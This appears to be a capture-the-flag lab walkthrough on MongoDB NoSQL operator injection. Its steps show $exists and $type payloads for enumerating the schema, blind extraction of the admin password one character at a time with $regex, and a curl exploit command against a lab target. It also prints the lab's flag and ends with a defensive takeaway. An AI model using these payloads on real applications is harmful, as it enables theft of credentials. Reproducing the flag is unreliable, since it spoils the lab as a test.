<h4>Step 1: Normal Search</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 1. Normal Search</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Field: </span>role &nbsp; <span class="prompt">Value: </span>admin<br>
        <span class="prompt">Query: </span>db.lab8_documents.find({"role": "admin"})<br><br>
        <span class="prompt">Output:</span><br>
        <strong>Username:</strong> admin: <strong>Email:</strong> admin@nosql-corp.io: <strong>Role:</strong> admin --
        <strong>Has Secret Note:</strong> Yes: <strong>Login Count:</strong> 42<br>
        <span class="prompt">// Password is NOT displayed in results</span>
    </div>
</div>

<h4>Step 2: Schema Discovery with $exists</h4>
<p>
    Use <code>$exists</code> to discover which documents have a <code>secret_note</code> field.
    The value field accepts JSON, so operators are parsed directly.
</p>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 2: $exists Enumeration</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Field: </span>secret_note &nbsp; <span class="prompt">Value: </span>{"$exists": true}<br>
        <span class="prompt">Output: </span>1 result (admin has secret_note: "The flag is the admin password")
    </div>
</div>

<h4>Step 3: Type Discovery with $type</h4>
<p>
    Use <code>$type</code> to discover field types. BSON type 2 = string, type 16 = int32.
</p>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 3: $type Enumeration</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Field: </span>password &nbsp; <span class="prompt">Value: </span>{"$type": "string"}<br>
        <span class="prompt">Output: </span>3 results (all users have string passwords)
    </div>
</div>

<h4>Step 4: Blind Extraction via $regex</h4>
<p>
    Use <code>$regex</code> on the <code>password</code> field to extract the admin password
    character by character. 1 result = match, 0 results = no match.
</p>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 4: $regex Extraction</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Field: </span>password &nbsp; <span class="prompt">Value: </span>{"$regex": "^F"} -> 1 result<br>
        <span class="prompt">Field: </span>password &nbsp; <span class="prompt">Value: </span>{"$regex": "^FL"} -> 1 result<br>
        <span class="prompt">Field: </span>password &nbsp; <span class="prompt">Value: </span>{"$regex": "^FLA"} -> 1 result<br>
        <span class="prompt">... </span>(continue for each character)<br>
        <span class="prompt">Field: </span>password &nbsp; <span class="prompt">Value: </span>{"$regex": "^FLAG\\{mg_bs0n_typ3_3x1sts\\}"} -> 1 result<br><br>
        <span class="prompt">Extracted: </span><strong>FLAG{mg_bs0n_typ3_3x1sts}</strong>
    </div>
</div>

<h4>Step 5: Submit the Flag</h4>
<p>
    Copy the flag and paste it into the verification form:
    <code>FLAG{mg_bs0n_typ3_3x1sts}</code>.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">curl. Full Exploit</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span># Blind extraction with $regex<br>
        <span class="prompt">$ </span>curl -s "http://target/SQLi-Arena/mongodb/lab8" \<br> --data-urlencode "field=password" \<br>
        &nbsp;&nbsp;--data-urlencode 'value={"$regex": "^FLAG"}'
    </div>
</div>

<div class="result-success result-box">
    <strong>Key Takeaway:</strong> MongoDB operators <code>$exists</code> and <code>$type</code>
    enable schema enumeration without knowing the document structure. <code>$exists</code>
    reveals which documents have specific fields, <code>$type</code> reveals BSON data types
    (string=2, int32=16, boolean=8, etc.), and <code>$regex</code> enables character-by-character
    blind extraction. When an application accepts JSON values and passes them to MongoDB queries,
    all operators become available to the attacker. Defense: always validate that query values
    are the expected type (string, number, etc.) and never pass raw JSON objects to queries.
</div>
